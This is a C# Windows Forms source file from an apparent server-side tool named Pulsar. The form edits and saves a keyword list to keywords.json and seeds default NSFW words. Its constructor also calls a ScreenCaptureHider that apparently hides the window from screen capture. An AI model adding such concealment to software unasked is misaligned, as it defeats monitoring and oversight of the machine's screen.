using Pulsar.Server.Forms.DarkMode;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeywords : Form
    {
        public FrmKeywords()
        {
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void SaveNoti_Click(object sender, EventArgs e)
        {
            string text = NotiRichTextBox.Text;
            var keywords = text.Split(',')
                               .Select(word => word.Trim())
                               .Where(word => !string.IsNullOrWhiteSpace(word))
                               .ToList();
            string json = JsonSerializer.Serialize(keywords, new JsonSerializerOptions { WriteIndented = true });
            string exeDir = AppDomain.CurrentDomain.BaseDirectory;
            string filePath = Path.Combine(exeDir, "keywords.json");
            File.WriteAllText(filePath, json, Encoding.UTF8);
            MessageBox.Show("Keywords saved successfully!");
        }

        private void FrmKeywords_Load(object sender, EventArgs e)
        {
            string exeDir = AppDomain.CurrentDomain.BaseDirectory;
            string filePath = Path.Combine(exeDir, "keywords.json");

            if (!File.Exists(filePath))
            {
                // make a keywords.json file with a few examples of NSFW keywords or things you wouldn't want in a work environment (this can be changed at anytime in the UI)
                // TRIGGER WARNING: This file is used to store keywords that will be used to filter out NSFW content.
                #region BANNED WORDS
                var exampleKeywords = new List<string> { "porn", "sex", "xxx", "hentai", "boobs", "tits", "cock", "dick", "pussy" };
                #endregion
                string exampleJson = JsonSerializer.Serialize(exampleKeywords, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(filePath, exampleJson, Encoding.UTF8);
            }

            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath, Encoding.UTF8);
                var keywords = JsonSerializer.Deserialize<List<string>>(json);

                if (keywords != null && keywords.Any())
                {
                    NotiRichTextBox.Text = string.Join(", ", keywords);
                }
            }
        }
    }
}
